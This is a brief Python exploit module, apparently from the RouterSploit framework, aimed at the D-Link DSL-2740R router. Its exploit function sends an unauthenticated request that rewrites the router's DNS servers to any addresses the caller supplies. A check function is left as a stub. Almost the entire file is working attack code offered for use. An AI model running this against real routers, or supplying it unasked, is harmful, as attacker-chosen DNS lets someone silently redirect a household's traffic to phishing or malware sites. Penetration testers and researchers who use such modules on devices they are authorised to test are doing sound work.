# rsf exploit module
# description: Module exploits D-Link DSL-2740R DNS change vulnerability
import requests

def exploit(target, port, dns1="8.8.8.8", dns2="8.8.4.4"):
    try:
        path = f"/Forms/dns_1?Enable_DNSFollowing=1&dnsPrimary={dns1}&dnsSecondary={dns2}"
        response = requests.post(f"http://{target}:{port}{path}", timeout=5)
        return response.status_code == 200
    except:
        return False

def check(target, port=80):
    return None  # Cannot verify without changing DNS
